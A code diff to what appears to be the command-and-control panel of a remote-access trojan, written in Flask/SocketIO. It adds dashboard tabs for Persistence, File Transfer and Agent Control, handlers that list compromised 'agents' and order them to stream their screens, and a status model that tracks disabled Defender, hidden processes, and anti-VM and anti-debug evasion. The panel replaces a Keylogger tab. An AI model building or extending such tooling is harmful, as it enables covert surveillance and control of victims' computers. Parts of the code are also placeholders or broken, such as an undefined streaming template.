@@ -1070,12 +1070,14 @@ DASHBOARD_HTML = r'''
       </div>
 
       <div class="nav-tabs" style="margin-left:22px">
-        <div class="nav-tab active">Overview</div>
-        <div class="nav-tab">List Process</div>
-        <div class="nav-tab">System Info</div>
-        <div class="nav-tab">Terminal</div>
-        <div class="nav-tab">Keylogger</div>
-        
+        <div class="nav-tab active" onclick="navigateTo('/dashboard')">Dashboard</div>
+        <div class="nav-tab" onclick="navigateTo('/streaming')">Streaming</div>
+        <div class="nav-tab" onclick="navigateTo('/security')">Security</div>
+        <div class="nav-tab" onclick="navigateTo('/monitoring')">Monitoring</div>
+        <div class="nav-tab" onclick="navigateTo('/persistence')">Persistence</div>
+        <div class="nav-tab" onclick="navigateTo('/filetransfer')">File Transfer</div>
+        <div class="nav-tab" onclick="navigateTo('/agents')">Agent Control</div>
+        <div class="nav-tab" onclick="navigateTo('/settings')">Settings</div>
       </div>
     </div>
 
@@ -1379,6 +1381,11 @@ DASHBOARD_HTML = r'''
   /* demo: append a start line */
   appendLog('Dashboard ready — waiting for agents');
 
+  // Navigation function
+  function navigateTo(path) {
+    window.location.href = path;
+  }
+
 </script>
 </body>
 </html>
@@ -1412,6 +1419,41 @@ def index():
 @require_auth
 def dashboard():
     return DASHBOARD_HTML
+
+@app.route("/streaming")
+@require_auth
+def streaming():
+    return STREAMING_HTML
+
+@app.route("/security")
+@require_auth
+def security():
+    return SECURITY_HTML
+
+@app.route("/monitoring")
+@require_auth
+def monitoring():
+    return MONITORING_HTML
+
+@app.route("/persistence")
+@require_auth
+def persistence():
+    return PERSISTENCE_HTML
+
+@app.route("/filetransfer")
+@require_auth
+def filetransfer():
+    return FILETRANSFER_HTML
+
+@app.route("/agents")
+@require_auth
+def agents():
+    return AGENTS_HTML
+
+@app.route("/settings")
+@require_auth
+def settings():
+    return SETTINGS_HTML
 
 # --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
 # 
@@ -2335,6 +2377,110 @@ def handle_webrtc_implement_frame_dropping(data):
         print(f"Error implementing frame dropping for {agent_id}: {e}")
         emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)
 
+# --- Navigation and Agent Management Events ---
+
+@socketio.on('get_agents')
+def handle_get_agents():
+    """Get list of all agents"""
+    try:
+        agents_list = []
+        for agent_id, agent_data in AGENTS_DATA.items():
+            if agent_data['sid']:  # Only return connected agents
+                agents_list.append({
+                    'id': agent_id,
+                    'hostname': agent_data.get('hostname', 'Unknown'),
+                    'ip': agent_data.get('ip', 'Unknown'),
+                    'os': agent_data.get('os', 'Unknown'),
+                    'status': 'online' if agent_data['sid'] else 'offline',
+                    'last_seen': agent_data.get('last_seen', 'Never')
+                })
+        
+        emit('agents_list', {'agents': agents_list}, room=request.sid)
+        print(f"Sent agents list to operator: {len(agents_list)} agents")
+    except Exception as e:
+        print(f"Error getting agents list: {e}")
+        emit('agents_list', {'error': str(e)}, room=request.sid)
+
+@socketio.on('get_agent_security')
+def handle_get_agent_security(data):
+    """Get security status for a specific agent"""
+    agent_id = data.get('agent_id')
+    
+    if not agent_id:
+        emit('agent_security_response', {'error': 'Agent ID required'}, room=request.sid)
+        return
+    
+    try:
+        # Mock security data - in real implementation, this would come from the agent
+        security_data = {
+            'agent_id': agent_id,
+            'privileges': {
+                'admin': False,
+                'method': None
+            },
+            'security': {
+                'defenderDisabled': False,
+                'processHidden': False,
+                'antiVMEnabled': False,
+                'antiDebugEnabled': False
+            }
+        }
+        
+        emit('agent_security_response', security_data, room=request.sid)
+        print(f"Sent security data for agent {agent_id}")
+    except Exception as e:
+        print(f"Error getting security data for {agent_id}: {e}")
+        emit('agent_security_response', {'error': str(e)}, room=request.sid)
+
+@socketio.on('webrtc_start_streaming')
+def handle_webrtc_start_streaming(data):
+    """Start WebRTC streaming for an agent"""
+    agent_id = data.get('agent_id')
+    stream_type = data.get('type', 'screen')
+    
+    if not agent_id:
+        emit('webrtc_stream_started', {'error': 'Agent ID required'}, room=request.sid)
+        return
+    
+    try:
+        # Notify agent to start streaming
+        socketio.emit('start_streaming', {
+            'type': stream_type,
+            'quality': 'auto'
+        }, room=agent_id)
+        
+        emit('webrtc_stream_started', {
+            'agent_id': agent_id,
+            'type': stream_type,
+            'status': 'started'
+        }, room=request.sid)
+        print(f"Started {stream_type} streaming for agent {agent_id}")
+    except Exception as e:
+        print(f"Error starting streaming for {agent_id}: {e}")
+        emit('webrtc_stream_started', {'error': str(e)}, room=request.sid)
+
+@socketio.on('webrtc_stop_streaming')
+def handle_webrtc_stop_streaming(data):
+    """Stop WebRTC streaming for an agent"""
+    agent_id = data.get('agent_id')
+    
+    if not agent_id:
+        emit('webrtc_stream_stopped', {'error': 'Agent ID required'}, room=request.sid)
+        return
+    
+    try:
+        # Notify agent to stop streaming
+        socketio.emit('stop_streaming', {}, room=agent_id)
+        
+        emit('webrtc_stream_stopped', {
+            'agent_id': agent_id,
+            'status': 'stopped'
+        }, room=request.sid)
+        print(f"Stopped streaming for agent {agent_id}")
+    except Exception as e:
+        print(f"Error stopping streaming for {agent_id}: {e}")
+        emit('webrtc_stream_stopped', {'error': str(e)}, room=request.sid)
+
 # WebRTC scaffolding code removed - not currently active
 
 if __name__ == "__main__":
@@ -2352,5 +2498,13 @@ if __name__ == "__main__":
         print(f"Performance tuning: Bandwidth estimation, Adaptive bitrate, Frame dropping")
         print(f"Production scale: Current={PRODUCTION_SCALE['current_implementation']}, Target={PRODUCTION_SCALE['target_implementation']}")
         print(f"Scalability limits: aiortc={PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']}, mediasoup={PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers']}")
+
+    # Placeholder HTML templates for other pages
+    SECURITY_HTML = r'''<!DOCTYPE html><html><head><title>Security</title></head><body><h1>Security Page</h1><p>Security features coming soon...</p><script>function navigateTo(path) { window.location.href = path; }</script></body></html>'''
+    MONITORING_HTML = r'''<!DOCTYPE html><html><head><title>Monitoring</title></head><body><h1>Monitoring Page</h1><p>Monitoring features coming soon...</p><script>function navigateTo(path) { window.location.href = path; }</script></body></html>'''
+    PERSISTENCE_HTML = r'''<!DOCTYPE html><html><head><title>Persistence</title></head><body><h1>Persistence Page</h1><p>Persistence features coming soon...</p><script>function navigateTo(path) { window.location.href = path; }</script></body></html>'''
+    FILETRANSFER_HTML = r'''<!DOCTYPE html><html><head><title>File Transfer</title></head><body><h1>File Transfer Page</h1><p>File transfer features coming soon...</p><script>function navigateTo(path) { window.location.href = path; }</script></body></html>'''
+    AGENTS_HTML = r'''<!DOCTYPE html><html><head><title>Agent Control</title></head><body><h1>Agent Control Page</h1><p>Agent control features coming soon...</p><script>function navigateTo(path) { window.location.href = path; }</script></body></html>'''
+    SETTINGS_HTML = r'''<!DOCTYPE html><html><head><title>Settings</title></head><body><h1>Settings Page</h1><p>Settings features coming soon...</p><script>function navigateTo(path) { window.location.href = path; }</script></body></html>'''
 
     socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)
